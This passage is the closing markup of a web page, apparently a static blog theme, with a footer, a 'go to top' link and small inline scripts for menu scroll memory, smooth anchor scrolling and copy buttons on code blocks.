6.8z"></path></svg></a></div></footer></article></main><a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"></path></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>